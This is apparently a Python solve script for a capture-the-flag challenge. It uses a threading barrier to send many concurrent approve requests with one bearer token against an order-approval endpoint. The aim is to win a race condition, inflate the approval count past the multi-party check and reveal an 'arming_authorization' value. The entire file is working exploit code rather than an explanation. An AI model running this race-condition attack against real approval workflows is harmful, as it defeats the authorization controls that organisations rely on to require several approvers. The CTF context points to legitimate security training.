import json, sys, threading, time
import requests

BASE = "http://w05.ctf.chronos-security.ro:33611"
TOK = "opk_vega7_2f4b9c17e0a3"
OID = "AO-7D31C9"
N = int(sys.argv[1]) if len(sys.argv) > 1 else 8

s = requests.Session()
order = s.get(f"{BASE}/orders/{OID}", headers={"Authorization": f"Bearer {TOK}"}, timeout=10).json()
print("before:", order["status"], "approvals", order["approvals"], "epoch", order["approval_epoch"])
if order["approval_records"]:
    age = None
print("retry_after_ms:", order.get("retry_after_ms"))

barrier = threading.Barrier(N + 1)
results = [None] * N

def worker(i):
    try:
        with requests.Session() as ss:  # own pool
            barrier.wait()
            r = ss.post(f"{BASE}/orders/{OID}/approve",
                        headers={"Authorization": f"Bearer {TOK}", "Connection": "close"},
                        timeout=15)
            results[i] = (r.status_code, r.text[:400])
    except Exception as e:
        results[i] = ("ERR", repr(e))

ts = [threading.Thread(target=worker, args=(i,)) for i in range(N)]
for t in ts: t.start()
barrier.wait()  # fire
for t in ts: t.join()

for i, r in enumerate(results):
    print(i, r[0], r[1])

time.sleep(0.2)
order = s.get(f"{BASE}/orders/{OID}", headers={"Authorization": f"Bearer {TOK}"}, timeout=10).json()
print("AFTER:", order["status"], "approvals", order["approvals"], "epoch", order["approval_epoch"])
print("records:", json.dumps(order["approval_records"]))
print("arming_authorization:", order.get("arming_authorization"))
